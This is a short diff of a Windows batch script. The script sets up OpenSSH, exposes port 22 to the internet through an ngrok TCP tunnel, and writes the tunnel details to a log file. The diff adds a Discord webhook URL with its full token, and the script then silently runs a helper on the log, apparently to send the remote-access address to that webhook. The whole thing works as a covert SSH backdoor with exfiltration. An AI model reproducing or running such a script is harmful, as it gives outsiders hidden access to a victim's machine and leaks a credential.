@@ -9,5 +9,5 @@ powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
 start ngrok tcp 22 -log=stdout > ngrok.log &
-set ""
+set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
 Source.bat -silent --file %temp%/ngrok.log
